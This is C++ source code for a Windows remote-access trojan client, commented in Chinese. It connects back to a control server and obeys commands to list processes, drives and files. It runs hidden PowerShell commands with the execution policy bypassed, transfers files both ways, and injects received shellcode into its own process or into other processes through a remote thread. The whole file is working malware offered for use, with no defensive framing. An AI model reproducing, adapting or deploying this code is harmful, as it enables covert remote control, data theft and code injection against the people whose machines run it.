#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>
#include <vector>

#pragma comment(lib, "WinInet.lib")
#pragma comment(lib,"ws2_32.lib")

using namespace std;

// -------------------------------------------------------------
// 获取系统进程列表
// -------------------------------------------------------------

typedef struct
{
	DWORD Is64;
	DWORD PID;
	CHAR ProcessName[2048];
}ProcessList;

std::vector<ProcessList> process_list_vect;

int Is64BitPorcess(DWORD dwProcessID)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
	if (!hProcess) return -1;

	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		GetModuleHandleW(L"kernel32"), "IsWow64Process");

	if (!fnIsWow64Process)
	{
		CloseHandle(hProcess);
		return -1;
	}

	BOOL bIsWow64 = FALSE;
	fnIsWow64Process(hProcess, &bIsWow64);
	CloseHandle(hProcess);

	return bIsWow64 ? 0 : 1;
}

BOOL EnumProcess()
{
	process_list_vect.clear();
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (SnapShot == INVALID_HANDLE_VALUE) return FALSE;

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(SnapShot, &pe32) == FALSE)
	{
		CloseHandle(SnapShot);
		return FALSE;
	}

	do
	{
		int is_64 = Is64BitPorcess(pe32.th32ProcessID);
		if (is_64 == -1) continue;

		ProcessList ptr;
		ptr.Is64 = is_64;
		ptr.PID = pe32.th32ProcessID;
		strncpy(ptr.ProcessName, pe32.szExeFile, sizeof(ptr.ProcessName) - 1);
		process_list_vect.push_back(ptr);

	} while (Process32Next(SnapShot, &pe32));

	CloseHandle(SnapShot);
	return TRUE;
}

// -------------------------------------------------------------
// 代码注入部分
// -------------------------------------------------------------
typedef struct
{
	DWORD PID;
	char ShellCode[4096];
}InjectCode;

void InjectSelfCode(char* shellcode)
{
	unsigned int char_in_hex;
	unsigned int iterations = strlen(shellcode);
	unsigned int memory_allocation = iterations / 2;

	for (unsigned int i = 0; i < memory_allocation; i++)
	{
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		shellcode[i] = (char)char_in_hex;
	}

	void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
	if (!exec) return;

	memcpy(exec, shellcode, memory_allocation);
	DWORD ignore;
	VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
	(*(void(*)()) exec)();
}

bool InjectRemoteCode(DWORD pid, char* shellcode)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) return false;

	unsigned int iterations = strlen(shellcode);
	unsigned int memory_allocation = iterations / 2;
	unsigned char* source = new unsigned char[memory_allocation];

	for (unsigned int i = 0; i < memory_allocation; i++)
	{
		unsigned int char_in_hex;
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		source[i] = (char)char_in_hex;
	}

	void* remoteBuffer = VirtualAllocEx(hProcess, NULL, memory_allocation,
		MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer)
	{
		CloseHandle(hProcess);
		delete[] source;
		return false;
	}

	if (!WriteProcessMemory(hProcess, remoteBuffer, source, memory_allocation, NULL))
	{
		VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		delete[] source;
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

	if (hThread)
	{
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	else
	{
		VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		delete[] source;
		return false;
	}

	VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	delete[] source;
	return true;
}

// -------------------------------------------------------------
// 获取系统磁盘个数与容量
// -------------------------------------------------------------

#define ToGB(x) (x.HighPart << 2) + (x.LowPart >> 20) / 1024.0

typedef struct
{
	double available_space;
	double free_space;
	double total_space;
}DriverInfo;

typedef struct
{
	char driver_name[128];
	char driver_type[128];
	double available_space;
	double free_space;
	double total_space;
}MyDriver;

int GutDrivesCount()
{
	DWORD drivers;
	int count = 0;

	drivers = GetLogicalDrives();
	while (drivers != 0)
	{
		if (drivers & 1 != 0) count++;
		drivers >>= 1;
	}
	return count;
}

std::string GetDrivesType(const char* lpRootPathName)
{
	UINT uDriverType = GetDriveType(lpRootPathName);
	switch (uDriverType)
	{
	case DRIVE_UNKNOWN:      return "未知类型";
	case DRIVE_NO_ROOT_DIR:  return "路径无效";
	case DRIVE_REMOVABLE:    return "可移动磁盘";
	case DRIVE_FIXED:        return "固定磁盘";
	case DRIVE_REMOTE:       return "网络磁盘";
	case DRIVE_CDROM:        return "光驱设备";
	case DRIVE_RAMDISK:      return "内存映射盘";
	default:                 return "错误参数";
	}
}

DriverInfo GetDrivesFreeSpace(const char* lpRootPathName)
{
	ULARGE_INTEGER available, total, free;
	DriverInfo ref = { 0 };

	if (GetDiskFreeSpaceEx(lpRootPathName, &available, &total, &free))
	{
		ref.total_space = ToGB(total);
		ref.free_space = ToGB(available);
		ref.available_space = ref.total_space - ref.free_space;
	}
	return ref;
}

std::vector<MyDriver> GetDriveForVector()
{
	std::vector<MyDriver> ref;
	char szLogicalDrives[MAX_PATH] = { 0 };

	DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
	if (dwResult == 0 || dwResult > MAX_PATH) return ref;

	char* szSingleDrive = szLogicalDrives;
	while (*szSingleDrive)
	{
		MyDriver my_driver_ptr = { 0 };
		std::string type = GetDrivesType(szSingleDrive);
		DriverInfo ptr = GetDrivesFreeSpace(szSingleDrive);

		strncpy(my_driver_ptr.driver_name, szSingleDrive, sizeof(my_driver_ptr.driver_name) - 1);
		strncpy(my_driver_ptr.driver_type, type.c_str(), sizeof(my_driver_ptr.driver_type) - 1);
		my_driver_ptr.total_space = ptr.total_space;
		my_driver_ptr.free_space = ptr.free_space;
		my_driver_ptr.available_space = ptr.available_space;

		ref.push_back(my_driver_ptr);
		szSingleDrive += strlen(szSingleDrive) + 1;
	}
	return ref;
}

// -------------------------------------------------------------
// 获取磁盘文件列表
// -------------------------------------------------------------
typedef struct
{
	char szFilePath[4095];
	char szFileName[2048];
	long long szFileSize;
}FileInfo;

long long GetFileSize(std::string FileName)
{
	FILE* pointer = fopen(FileName.c_str(), "rb");
	if (!pointer) return 0;

	fseek(pointer, 0, SEEK_END);
	long long size = ftell(pointer);
	fclose(pointer);
	return size;
}

bool SearchFile(char *pszDirectory, std::vector<FileInfo> &vect)
{
	vect.clear();
	char szFileName[MAX_PATH] = { 0 };
	char pTempSrc[MAX_PATH] = { 0 };
	WIN32_FIND_DATA FileData = { 0 };

	sprintf(szFileName, "%s\\*.*", pszDirectory);
	HANDLE hFile = FindFirstFile(szFileName, &FileData);
	if (hFile == INVALID_HANDLE_VALUE) return false;

	do
	{
		if (FileData.cFileName[0] == '.') continue;

		sprintf(pTempSrc, "%s\\%s", pszDirectory, FileData.cFileName);
		if (!(FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			FileInfo info = { 0 };
			strncpy(info.szFilePath, pTempSrc, sizeof(info.szFilePath) - 1);

			char* fname = strrchr(pTempSrc, '\\') + 1;
			if (!fname) fname = pTempSrc;
			strncpy(info.szFileName, fname, sizeof(info.szFileName) - 1);

			info.szFileSize = GetFileSize(pTempSrc);
			vect.push_back(info);
		}
	} while (FindNextFile(hFile, &FileData));

	FindClose(hFile);
	return true;
}

// -------------------------------------------------------------
// 匿名管道执行CMD部分
// -------------------------------------------------------------

bool HideRunCmd(const char* cmdStr, std::string& output)
{
	output.clear();
	if (!cmdStr || cmdStr[0] == '\0')
	{
		output = "错误：命令为空";
		return false;
	}

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
	{
		output = "创建管道失败：" + std::to_string(GetLastError());
		return false;
	}

	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

	std::string command;
	command = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -Command \"";
	command += cmdStr;
	command += "\"";

	// 若需要CMD：command = "cmd.exe /c " + std::string(cmdStr);

	PROCESS_INFORMATION pi = { 0 };

	BOOL bCreate = CreateProcessA(
		NULL,                   
		(char*)command.c_str(),
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi
		);

	CloseHandle(hWritePipe);
	hWritePipe = NULL;

	if (!bCreate)
	{
		CloseHandle(hReadPipe);
		output = "创建进程失败：" + std::to_string(GetLastError());
		return false;
	}

	const DWORD BUF_SIZE = 4096;
	char buf[BUF_SIZE] = { 0 };
	DWORD dwRead = 0;

	while (ReadFile(hReadPipe, buf, BUF_SIZE - 1, &dwRead, NULL))
	{
		if (dwRead == 0) break;
		buf[dwRead] = '\0';
		output += buf;
		memset(buf, 0, sizeof(buf));
	}

	DWORD dwErr = GetLastError();
	if (dwErr != ERROR_BROKEN_PIPE && dwErr != ERROR_SUCCESS)
	{
		output += "\n读取管道失败：" + std::to_string(dwErr);
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);

	return true;
}

// -------------------------------------------------------------
// 发送接收文件部分
// -------------------------------------------------------------

char* GetFileName(char* Path)
{
	if (!Path) return NULL;

	char* ref = strrchr(Path, '\\');
	if (ref) return ref + 1;

	ref = strrchr(Path, '/');
	if (ref) return ref + 1;

	return Path;
}

bool RecvFile(SOCKET ptr, char* LocalPath, char* RemoteFile)
{
	if (!ptr || !LocalPath || !RemoteFile) return false;

	if (send(ptr, RemoteFile, strlen(RemoteFile) + 1, 0) <= 0)
		return false;

	long long file_size = 0;
	if (recv(ptr, (char*)&file_size, sizeof(long long), 0) != sizeof(long long) || file_size <= 0)
		return false;

	char* file_name = GetFileName(RemoteFile);
	if (!file_name) return false;

	char file_all_name[4096] = { 0 };
	strcat(file_all_name, LocalPath);
	if (file_all_name[strlen(file_all_name) - 1] != '\\' &&
		file_all_name[strlen(file_all_name) - 1] != '/')
		strcat(file_all_name, "\\");
	strcat(file_all_name, file_name);

	FILE* pointer = fopen(file_all_name, "wb");
	if (!pointer) return false;

	char buffer[1024] = { 0 };
	long long total_length = 0;

	while (total_length < file_size)
	{
		int length = recv(ptr, buffer, sizeof(buffer), 0);
		if (length <= 0)
		{
			fclose(pointer);
			remove(file_all_name);
			return false;
		}

		if (fwrite(buffer, 1, length, pointer) != (size_t)length)
		{
			fclose(pointer);
			remove(file_all_name);
			return false;
		}

		total_length += length;
		memset(buffer, 0, sizeof(buffer));
	}

	fclose(pointer);
	return true;
}

bool SendFile(SOCKET ptr)
{
	if (!ptr) return false;

	char file_path[4096] = { 0 };
	if (recv(ptr, file_path, sizeof(file_path) - 1, 0) <= 0)
		return false;

	long long file_size = GetFileSize(file_path);
	if (file_size <= 0)
		return false;

	if (send(ptr, (char*)&file_size, sizeof(long long), 0) != sizeof(long long))
		return false;

	FILE* pointer = fopen(file_path, "rb");
	if (!pointer) return false;

	char buffer[1024] = { 0 };
	long long total_sent = 0;
	size_t length;

	while ((length = fread(buffer, 1, sizeof(buffer), pointer)) > 0)
	{
		if (send(ptr, buffer, length, 0) != (int)length)
		{
			fclose(pointer);
			return false;
		}
		total_sent += length;
		memset(buffer, 0, sizeof(buffer));
	}

	fclose(pointer);
	return total_sent == file_size;
}

int main(int argc, char* argv[])
{
	const char* server_ip = "127.0.0.1";
	const int server_port = 8090;

listen_:
	while (1)
	{
		WSADATA wsaData = { 0 };
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		{
			Sleep(5000);
			continue;
		}

		SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == INVALID_SOCKET)
		{
			WSACleanup();
			Sleep(5000);
			continue;
		}

		sockaddr_in server_addr = { 0 };
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(server_port);
		inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

		// 连接服务端
		if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
		{
			closesocket(sock);
			WSACleanup();
			printf("连接服务端 %s:%d 失败，5秒后重试...\n", server_ip, server_port);
			Sleep(5000);
			continue;
		}

		printf("成功连接到服务端 %s:%d\n", server_ip, server_port);

		// 处理服务端命令
		while (1)
		{
			char buf[4096] = { 0 };
			int recv_len = recv(sock, buf, sizeof(buf) - 1, 0);
			if (recv_len <= 0)
			{
				printf("与服务端断开连接，尝试重连...\n");
				break;
			}

			// 处理进程列表请求
			else if (strcmp(buf, "GetProcessList") == 0)
			{
				EnumProcess();
				DWORD count = process_list_vect.size();
				send(sock, (char*)&count, sizeof(DWORD), 0);

				DWORD recv_count = 0;
				recv(sock, (char*)&recv_count, sizeof(DWORD), 0);

				if (count == recv_count)
				{
					for (size_t i = 0; i < count; i++)
					{
						send(sock, (char*)&process_list_vect[i], sizeof(ProcessList), 0);
					}
				}
				printf("已发送进程列表（%d个进程）\n", count);
			}
			// 处理磁盘列表请求
			else if (strcmp(buf, "GetDiskList") == 0)
			{
				std::vector<MyDriver> disks = GetDriveForVector();
				DWORD count = disks.size();
				send(sock, (char*)&count, sizeof(DWORD), 0);

				DWORD recv_count = 0;
				recv(sock, (char*)&recv_count, sizeof(DWORD), 0);

				if (count == recv_count)
				{
					for (size_t i = 0; i < count; i++)
					{
						send(sock, (char*)&disks[i], sizeof(MyDriver), 0);
					}
				}
				printf("已发送磁盘列表（%d个磁盘）\n", count);
			}
			// 处理文件列表请求
			else if (strcmp(buf, "GetDiskFileList") == 0)
			{
				char path[4096] = { 0 };
				recv(sock, path, sizeof(path) - 1, 0);

				std::vector<FileInfo> files;
				SearchFile(path, files);

				DWORD count = files.size();
				send(sock, (char*)&count, sizeof(DWORD), 0);

				DWORD recv_count = 0;
				recv(sock, (char*)&recv_count, sizeof(DWORD), 0);

				if (count == recv_count)
				{
					for (size_t i = 0; i < count; i++)
					{
						send(sock, (char*)&files[i], sizeof(FileInfo), 0);
					}
				}
				printf("已发送文件列表（%d个文件）\n", count);
			}
			// 处理命令执行请求
			else if (strcmp(buf, "GetCommand") == 0)
			{
				char cmd[4096] = { 0 };
				recv(sock, cmd, sizeof(cmd) - 1, 0);

				std::string result;
				HideRunCmd(cmd, result);

				const int SEND_BLOCK_SIZE = 4096;
				int total_sent = 0;
				int result_len = result.size();

				while (total_sent < result_len)
				{
					int send_len = min(SEND_BLOCK_SIZE, result_len - total_sent);
					send(sock, result.c_str() + total_sent, send_len, 0);
					total_sent += send_len;
				}

				printf("已执行命令：%s，输出长度：%d\n", cmd, result_len);
			}

			else if (strcmp(buf, "RecvFile") == 0)
			{
				bool success = SendFile(sock);
				printf("文件发送 %s\n", success ? "成功" : "失败");
			}
			else if (strcmp(buf, "SendFile") == 0)
			{
				typedef struct
				{
					CHAR LocalPath[4096];
					CHAR RemotePath[4096];
				}SendFilePath;

				SendFilePath path_info;
				recv(sock, (char*)&path_info, sizeof(SendFilePath), 0);

				bool success = RecvFile(sock, path_info.RemotePath, path_info.LocalPath);
				printf("文件接收 %s（保存到：%s）\n",
					success ? "成功" : "失败", path_info.RemotePath);
			}
			else if (strcmp(buf, "InjectSelfCode") == 0)
			{
				InjectCode code;
				recv(sock, (char*)&code, sizeof(InjectCode), 0);
				InjectSelfCode(code.ShellCode);
				printf("已注入ShellCode到自身进程\n");
			}
			else if (strcmp(buf, "InjectRemoteCode") == 0)
			{
				InjectCode code;
				recv(sock, (char*)&code, sizeof(InjectCode), 0);
				bool success = InjectRemoteCode(code.PID, code.ShellCode);
				printf("远程进程注入 %s（PID：%d）\n", success ? "成功" : "失败", code.PID);
			}
			else if (strcmp(buf, "Exit") == 0)
			{
				printf("收到退出命令，正在关闭...\n");
				closesocket(sock);
				WSACleanup();
				return 0;
			}
			else if (strcmp(buf, "Ping") == 0)
			{
				send(sock, "Pong", 4, 0);
			}
			else if (strcmp(buf, "CloseServer") == 0)
			{
				printf("服务端已关闭，尝试重连...\n");
				break;
			}
		}

		closesocket(sock);
		WSACleanup();
		Sleep(5000);
	}

	return 0;
}
